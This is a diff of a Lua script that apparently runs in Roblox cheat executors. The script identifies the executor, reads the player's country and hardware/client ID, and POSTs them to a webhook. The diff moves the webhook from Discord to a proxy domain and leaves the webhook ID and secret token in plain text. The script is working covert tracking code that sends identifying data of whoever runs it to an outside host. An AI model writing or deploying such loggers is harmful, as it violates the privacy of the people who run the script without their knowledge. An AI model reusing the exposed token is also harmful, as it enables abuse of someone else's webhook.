@@ -1,12 +1,9 @@
-game:GetService("RbxAnalyticsService"):GetClientId()
-
-
-local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit Exploit/Unknown Exploit"
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Unknown Exploit"
 local plr = game:GetService("Players").LocalPlayer
 local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(plr)
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-local url = "https://discord.com/api/webhooks/967597785534840892/AzzhDhGUeQPwk_VFZ5HDsNfxfDM4osgLR1fBEvTpEcB_-T7QhoSs8d_8LgJA65yTLH7n"
+local url = "https://webhook.lewistehminerz.dev/api/webhooks/967597785534840892/AzzhDhGUeQPwk_VFZ5HDsNfxfDM4osgLR1fBEvTpEcB_-T7QhoSs8d_8LgJA65yTLH7n"
 local data = {
    ["embeds"] = {
        {
@@ -29,4 +26,3 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
---Exactly--
